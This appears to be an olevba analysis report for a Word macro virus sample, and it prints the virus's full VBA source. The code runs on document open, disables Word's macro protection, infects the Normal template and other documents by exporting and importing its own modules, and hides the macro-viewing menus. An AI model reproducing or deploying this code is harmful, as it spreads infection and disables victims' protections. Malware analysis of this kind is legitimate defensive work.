olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
AM.UserForm_Click
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
Select Case Day(Now)
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
Case 25 To 31
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
AM.Show
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
End Select
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
End Sub
-------------------------------------------------------------------------------
VBA MACRO AM.frm 
in file: Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7 - OLE stream: 'Macros/VBA/AM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
Sub UserForm_Click()
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
On Error GoTo out
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
Options.VirusProtection = False
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
Options.SaveNormalPrompt = False
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
Options.ConfirmConversions = False
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
If nt > 0 And ad > 0 Then GoTo out
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
If nt = 0 Then
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    Set infect = NormalTemplate.VBProject.VBComponents
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    Set host = ActiveDocument.VBProject.VBComponents
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    host.Item(1).codemodule.replaceline 3, Application.UserInitials & ".UserForm_Click"
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    host.Item(1).codemodule.replaceline 5, "select case day(now)"
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    host.Item(1).codemodule.replaceline 7, "case 25 to 31"
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    host.Item(1).codemodule.replaceline 9, Application.UserInitials & ".show"
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    host.Item(1).codemodule.replaceline 11, "end select"
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    host.Item(1).Name = infect.Item(1).Name
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    host.Item(2).Name = Application.UserInitials
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    host.Item(1).Export "c:\kernel.sys"
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    host.Item(2).Export "c:\kernel2.sys"
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
End If
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
If ad = 0 Then Set infect = ActiveDocument.VBProject.VBComponents
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
infect.Import ("c:\kernel2.sys")
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
infect.Item(1).codemodule.AddFromFile ("c:\kernel.sys")
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
With infect.Item(1).codemodule
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    For x = 1 To 4
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    .deletelines 1
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    Next x
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    If nt = 0 Then
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    .insertlines 14, vbCr & "Sub ViewVBCode()"
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    .insertlines 16, vbCr & "End Sub"
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    .insertlines 18, vbCr & "Sub ToolsMacro()"
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    .insertlines 20, vbCr & "End Sub"
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    CommandBars("tools").Controls("Templates and add-ins...").Delete
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    End If
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
End With
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
If nt = 0 Then infect.Item(1).codemodule.replaceline 1, "Sub AutoClose()"
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
If nt = 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
With infect.Item(2).codemodule
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    .deletelines 1
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    For x = 1 To infect.Item(2).codemodule.countoflines Step 2
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    Next x
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
End With
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
With infect.Item(1).codemodule
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    For x = 2 To infect.Item(1).codemodule.countoflines Step 2
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
    Next x
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
End With
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
out:
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
If nt <> 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc
End Sub
'Andreas Marx27.07.01 08:51:22Universal on FILE:dok1.doc

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�DiWa�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-=-=-=-=-}G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�This message was dedicated 2 all my friends, who have good skill but terminated from their company, and become jobless
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�You Will Be MissedG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Keep your good working guys, We appreciated with all you have done, good luck and success 4 U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7' - OLE stream: 'Macros/AM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7' - OLE stream: 'Macros/AM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7' - OLE stream: 'Macros/AM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN 'Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7' - OLE stream: 'Macros/AM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN 'Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7' - OLE stream: 'Macros/AM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label11'" IN 'Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7' - OLE stream: 'Macros/AM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label12'" IN 'Virus.MSWord.Class.bx-8207ad0accea4d4874be6078a571b4c9853ca6c7' - OLE stream: 'Macros/AM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

